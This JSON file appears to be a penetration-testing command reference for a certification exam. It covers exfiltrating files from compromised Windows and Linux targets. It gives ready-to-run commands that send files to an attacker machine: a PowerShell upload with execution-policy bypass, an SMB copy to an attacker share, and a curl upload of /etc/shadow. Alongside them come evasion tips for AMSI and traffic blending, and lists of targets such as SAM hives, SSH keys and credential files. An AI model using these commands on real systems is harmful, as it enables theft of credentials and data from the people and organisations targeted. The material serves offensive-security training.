{
  "category": "file-transfer",
  "subcategory": "upload",
  "description": "File upload and exfiltration methods",
  "commands": [
    {
      "id": "ft-powershell-upload",
      "name": "Windows: PowerShell Upload File",
      "category": "file-transfer",
      "subcategory": "upload",
      "command": "powershell -ep bypass -c \"Invoke-RestMethod -Uri http://<LHOST>:<PORT>/upload -Method Post -InFile '<FILE>'\"",
      "description": "Upload file from Windows target to uploadserver (exfiltration)",
      "tags": [
        "FILE_TRANSFER",
        "WINDOWS",
        "POWERSHELL",
        "UPLOAD",
        "EXFILTRATION",
        "QUICK_WIN"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP running uploadserver",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Uploadserver port",
          "example": "80",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to exfiltrate from target",
          "example": "C:\\Users\\user\\Desktop\\proof.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "Invoke-RestMethod": "PowerShell cmdlet for REST API operations - simpler than Invoke-WebRequest for POST uploads",
        "-Uri": "Target URL - must include /upload endpoint for uploadserver",
        "-Method Post": "HTTP method - required for file uploads",
        "-InFile": "Input file path - file to upload from target system",
        "Single quotes around path": "Required if path contains spaces or special characters"
      },
      "success_indicators": [
        "StatusCode : 200",
        "No error output from PowerShell",
        "File appears on Kali: ls -lh"
      ],
      "failure_indicators": [
        "Unable to connect - uploadserver not running or wrong IP/port",
        "404 Not Found - missing /upload in URL",
        "Execution policy blocked - missing -ep bypass",
        "File not found - wrong path on target"
      ],
      "troubleshooting": {
        "Connection refused": "Ensure uploadserver running: python3 -m uploadserver <PORT>",
        "404 error": "URL must end with /upload: http://<IP>:<PORT>/upload",
        "AMSI blocked script": "Obfuscate or use alternative: ft-smb-upload or ft-nc-send",
        "Large file times out": "Uploadserver supports large files, but check network stability. For files >100MB use ft-smb-upload",
        "File path error": "Use full paths with quotes: -InFile 'C:\\Users\\user\\file.txt'"
      },
      "prerequisites": [
        "ft-uploadserver"
      ],
      "alternatives": [
        "ft-smb-upload",
        "ft-nc-send",
        "exfil-powershell-base64"
      ],
      "next_steps": [
        "ft-file-verify-md5"
      ],
      "notes": "certification METHODOLOGY: Primary exfiltration method for Windows targets. Clean, fast, uses HTTPS-capable PowerShell. Ideal for proof.txt, database dumps, or any files under 100MB.\n\nMANUAL ALTERNATIVE: Could manually encode file as base64 and copy/paste, but direct upload is faster and cleaner.\n\nEXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first. Verify upload success: ls -lh and md5sum on Kali.\n\nCOMMON TARGETS: proof.txt, local.txt, SAM/SYSTEM hives, Secretsdump.py output, screenshots, database files.\n\nVS SMB UPLOAD: PowerShell upload works over HTTP (port 80/443) which often passes egress filters better than SMB (port 445). SMB is faster for large files.\n\nTIME ESTIMATE: 2-10 seconds for typical proof files (<1MB), longer for large files (database dumps, memory dumps).",
      "filled_example": "powershell -ep bypass -c \"Invoke-RestMethod -Uri http://10.10.14.5:80/upload -Method Post -InFile 'C:\\Users\\user\\Desktop\\proof.txt'\""
    },
    {
      "id": "ft-smb-upload",
      "name": "Windows: Upload to SMB Share",
      "category": "file-transfer",
      "subcategory": "upload",
      "command": "copy \"<FILE>\" \\\\<LHOST>\\<SHARE>\\",
      "description": "Upload file from Windows target to Kali SMB share (fastest for large files)",
      "tags": [
        "FILE_TRANSFER",
        "WINDOWS",
        "SMB",
        "UPLOAD",
        "EXFILTRATION",
        "QUICK_WIN"
      ],
      "variables": [
        {
          "name": "<FILE>",
          "description": "File to exfiltrate from target",
          "example": "C:\\Users\\user\\Desktop\\data.zip",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attack machine IP running SMB server",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "SMB share name from impacket-smbserver",
          "example": "share",
          "required": true
        }
      ],
      "flag_explanations": {
        "copy": "Native Windows command - also supports wildcards: copy C:\\*.txt \\\\<IP>\\share\\",
        "Quotes around path": "Required if filename/path contains spaces",
        "/y": "Optional - suppress overwrite confirmation: copy /y source dest",
        "Trailing backslash": "Important - indicates destination is directory, not filename"
      },
      "success_indicators": [
        "1 file(s) copied",
        "File appears on Kali: ls -lh",
        "File size matches: ls -lh <FILE> on both sides"
      ],
      "failure_indicators": [
        "The network path was not found - SMB server not running",
        "Access is denied - need authentication",
        "Network name cannot be found - port 445 blocked"
      ],
      "troubleshooting": {
        "Network path not found": "Verify SMB server running on Kali: sudo netstat -antp | grep 445",
        "Access denied on Windows 10+": "Use authenticated SMB server: impacket-smbserver share . -smb2support -username user -password pass. Then: net use \\\\<IP>\\share /user:user pass",
        "Port 445 blocked by firewall": "Check connectivity: Test-NetConnection <IP> -Port 445. Use alternative: ft-powershell-upload",
        "File too large": "SMB handles large files well (multi-GB). If failing, check disk space on Kali: df -h",
        "Authentication prompts repeatedly": "Clear cached credentials: net use \\\\<IP>\\share /delete, then reconnect"
      },
      "prerequisites": [
        "ft-smb-server"
      ],
      "alternatives": [
        "ft-powershell-upload",
        "ft-nc-send"
      ],
      "next_steps": [],
      "notes": "certification METHODOLOGY: Fastest exfiltration method for large files (>10MB) from Windows targets. 10-100x faster than HTTP for database dumps, memory dumps, or archives. Works well on internal networks where port 445 allowed.\n\nMANUAL ALTERNATIVE: Mount as persistent drive: net use Z: \\\\<IP>\\share then copy files to Z:\\ drive.\n\nEXAM TIP: If uploading multiple files, use wildcards: copy C:\\loot\\*.* \\\\<IP>\\share\\ to transfer entire directory. For newer Windows (10+), expect to need authentication - setup SMB server with -username/-password flags.\n\nSECURITY EVASION: SMB file copies blend with normal network file sharing traffic, harder to detect than HTTP uploads.\n\nVS HTTP UPLOAD: SMB is much faster for large files but requires port 445. HTTP upload works through more restrictive firewalls (port 80/443).\n\nTIME ESTIMATE: Limited only by network speed - can transfer multi-GB files in minutes on local network.",
      "filled_example": "copy \"C:\\Users\\user\\Desktop\\data.zip\" \\\\10.10.14.5\\share\\"
    },
    {
      "id": "ft-curl-upload",
      "name": "Linux: Curl Upload File",
      "category": "file-transfer",
      "subcategory": "upload",
      "command": "curl -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload",
      "description": "Upload file from Linux target to uploadserver (exfiltration)",
      "tags": [
        "FILE_TRANSFER",
        "LINUX",
        "CURL",
        "UPLOAD",
        "EXFILTRATION"
      ],
      "variables": [
        {
          "name": "<FILE>",
          "description": "File to exfiltrate from target",
          "example": "/etc/shadow",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attack machine IP running uploadserver",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Uploadserver port",
          "example": "80",
          "required": true
        }
      ],
      "flag_explanations": {
        "-X POST": "HTTP method - specify POST for file uploads (required for uploadserver /upload endpoint)",
        "-F file=@<PATH>": "Form upload - reads file content and sends as multipart/form-data. @ prefix reads from file",
        "@": "Read from file - without @, curl would send literal filename string instead of file contents",
        "-#": "Progress bar - cleaner output than default verbose progress, useful for large files: curl -# -X POST...",
        "-k": "Allow insecure SSL - use if uploadserver on HTTPS with self-signed cert"
      },
      "success_indicators": [
        "100 Continue",
        "200 OK",
        "Progress bar reaches 100%",
        "File appears on Kali: ls -lh"
      ],
      "failure_indicators": [
        "Connection refused - uploadserver not running",
        "404 Not Found - missing /upload in URL",
        "413 Payload Too Large - file exceeds server limit",
        "No route to host - network/firewall issue"
      ],
      "troubleshooting": {
        "Connection refused": "Ensure uploadserver running on Kali: python3 -m uploadserver <PORT>",
        "404 error": "URL must include /upload endpoint: http://<IP>:<PORT>/upload",
        "Large file fails": "Uploadserver supports large files by default. Check network stability and disk space on Kali: df -h",
        "Permission denied reading file": "Check file permissions: ls -la <FILE>. If root-owned, use sudo: sudo curl...",
        "curl not found": "Use alternative: ft-nc-send or ft-base64-encode"
      },
      "prerequisites": [
        "ft-uploadserver"
      ],
      "alternatives": [
        "ft-nc-send",
        "ft-scp-upload"
      ],
      "next_steps": [],
      "notes": "certification METHODOLOGY: Primary exfiltration method for Linux targets. Clean, fast, uses HTTP which typically passes egress filters. Ideal for proof.txt, /etc/shadow, database dumps, or any sensitive files.\n\nMANUAL ALTERNATIVE: Could use base64 encoding and copy/paste for small files, but direct upload is cleaner and works for binary files.\n\nALTERNATIVE UPLOAD: curl --upload-file <FILE> http://<IP>:<PORT>/ (PUT method, may not work with uploadserver)\n\nEXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first (/root/loot/<TARGET>/). Verify upload: ls -lh and md5sum.\n\nCOMMON TARGETS: proof.txt, /etc/passwd, /etc/shadow, .ssh/id_rsa, database dumps, config files with credentials.\n\nPROGRESS INDICATION: Add -# for progress bar on large files: curl -# -X POST -F file=@largefile.zip http://...\n\nTIME ESTIMATE: 2-5 seconds for typical files (<5MB), longer for large database/memory dumps.",
      "filled_example": "curl -X POST -F file=@/etc/shadow http://10.10.14.5:80/upload"
    }
  ]
}